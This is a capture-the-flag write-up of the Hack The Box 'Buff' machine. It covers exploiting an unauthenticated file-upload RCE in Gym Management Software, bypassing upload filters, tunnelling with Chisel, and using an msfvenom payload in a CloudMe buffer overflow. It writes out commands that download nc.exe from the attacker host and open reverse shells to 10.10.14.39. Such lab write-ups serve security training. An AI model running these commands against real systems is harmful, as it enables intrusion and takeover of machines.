---
layout: post
title:  "Hack The Box - Buff Writeup"
date:   2020-11-21 06:00:00
categories: Security CTF HTB"
author: Ryan
---

*[Hack The Box](https://hackthebox.eu) is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.*  
![HTB - Buff](../images/HTB-Buff/Header.png)

Buff is an Easy level Windows machine. The box statistics show us that we will be focusing heavily on existing CVEs, while working on enumeration skills in a somewhat realistic setup.  
![Buff Statistics](../images/HTB-Buff/Statistics.png)

## Information Gathering

#### Nmap:
By scanning the tartget IP with Nmap, we're able to find what ports are open, while fingerprinting the services running and their versions.  
`>> nmap -p7680,8080 -sC -sV -Pn  -oA Extracts/Buff 10.10.10.198`
![Nmap](../images/HTB-Buff/nmap.png)

### Mrb3n's Bro Hut
Navigating to [http://10.10.10.198:8080](http://10.10.10.198:8080) leads us to what appears to be a pretty basic gym website. We can see infomation around their offerings, pricing, and facilities. One piece of information that stands out can be seen on the [Contact](http://10.10.10.198:8080/contact.php) page.  
![Buff Statistics](../images/HTB-Buff/Information_Gathering_GymManagementSoftware.png)

## Foothold
By researching the Gym Management Software version 1.0, we can see there are a wide range of reported vulnerabilities. An [Unauthenticated RCE](https://www.exploit-db.com/exploits/48506) exploit can be found on Exploit-DB, and looks to be promising.

### Script Usage
After downloading the exploit to our machine, we can learn more about its usage with the following command:  
`>> python 48506.py`
![Shell Help](../images/HTB-Buff/Shell_Help.png)

### Running the Script
Passing in our target server, the exploit runs successfully, and we gain shell access.  
`>> python 48506.py http://10.10.10.198:8080/`
![Shell Run](../images/HTB-Buff/Shell_Run.png)

### How it works
Reading through the exploit, it appears that the Gym Management Software is missing user authentication on its file upload at `upload.php`. Combining this with a few tricks to bypass any file upload restrictions, and we're able to achieve a basic web shell.

File Restriction Bypasses:
* **Filename.php.png**: If the server is only checking the last file extension, we're able to successfully pass the check by appending ".png" to the file name.
* **image/png**: By setting the content-type to image/png, we're telling the server that the file is an image, nothing suspicious to see here.
* **Magic Bytes**: In case the server decides to check the content of the file, rather than just the filename and content-type, we're passing it a series of "magic bytes" which act as a file signature. The bytes sent in this case, `\x89\x50\x4e\x47\x0d\x0a\x1a`, represent a PNG file.  
![Shell Code 1](../images/HTB-Buff/Shell_Code_1.png)

## Enumeration
### User Flag
We appear to be running as the user `shaun`. Let's see if we can get the User Flag.  
`>> type C:\Users\shaun\Desktop\user.txt`
![User Flag](../images/HTB-Buff/User_Flag.png)

### Upgrade Shell
Before we get too far into the box, let's upgrade our shell using Netcat. The current shell is very basic and unable to do many of the tasks we may need when enumerating or trying to escalate privileges later.

Set up local server to get nc.exe onto the target box. Make sure that you've got a local copy of nc.exe in whatever directory you're hosting from.    
`>> python -m SimpleHTTPServer`

Downloading Netcat  
`>> powershell -c "Invoke-WebRequest -Uri '10.10.14.39:8000/nc64.exe' -OutFile 'nc.exe'"`

Setting up a listener on our local machine  
`>> nc -lvnp 3333`

Starting Netcat from taget box  
`>> .\nc.exe 10.10.14.39 3333 -e cmd.exe`

### Looking Around
Its possible that there are additional users to pivot to, lets check.  
`>> dir C:\Users`  
![User Enum](../images/HTB-Buff/Enum_Users.png)

With no additional users to work with, we can continue looking through shaun's directories  
`>> dir C:\Users\shaun\Downloads`  
![Downloads Enum](../images/HTB-Buff/Enum_Downloads.png)

CloudMe_1112.exe looks interesting. A little research shows it runs on port 8888 by default. Let's see if there's anything listening there.  
`>> netstat -a`  
![Network Enum](../images/HTB-Buff/Enum_Network.png)

By checking the list of processes running, we can see if CloudMe is already running and if it's process is owned by another user (perhaps Admin?).  
`>> tasklist /v`  
![Process Enum](../images/HTB-Buff/Enum_Process.png)

It looks like CloudMe is running as a user other than shaun. This is promising, since Administrator was the only other account we found.

## Privilege Escalation
If the name "Buff" wasn't enough of a hint of what's to come, you may be surprised to find that CloudMe 1.11.2 is vulnerable to a [Buffer Overflow](https://www.exploit-db.com/exploits/48389). It first requires us to get network access to the service running on port 8888. Let's get that set up with a small TCP/UDP Tunneling tool called [Chisel](https://github.com/jpillora/chisel).

### Tunnelling Port 8888
Start Listener on local machine over port 8800  
`>> sudo ./chisel server -p 8800 -reverse`

Download Chisel.exe to target box  
`>> powershell -c "Invoke-WebRequest -Uri '10.10.14.39:8000/chisel.exe' -OutFile 'chisel.exe'"`

Tunnel connection from target box to local machine  
`>> chisel.exe client 10.10.14.39:8800 R:8888:127.0.0.1:8888`

Result:  
![PrivEsc Tunnel](../images/HTB-Buff/PrivEsc_Tunnel.png)

### Generating Payload
The exploit we're using is currently set up to launch calc.exe. By using msfvenom, we can create a custom payload to do anything we want. Because the  
`>> msfvenom -a x86 -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe 10.10.14.39 4444 -e cmd.exe' -b '\x00\x0A\x0D' -f python -v payload`  
![Payload Generation](../images/HTB-Buff/Payload_Generation.png)

### Execution
With our updated exploit, we'll be able to trigger the buffer overflow and 

Set up another listener on our local machine  
`>> nc -lvnp 4444`

Running completed exploit  
`>> python 48389.py`  
![Root Shell](../images/HTB-Buff/Shell_Root.png)

### Root Flag
With our administrative shell, we're able to retrieve the flag  
`>> type C:\Users\Administrator\Desktop\root.txt`  
![Root Flag](../images/HTB-Buff/Root_Flag.png)

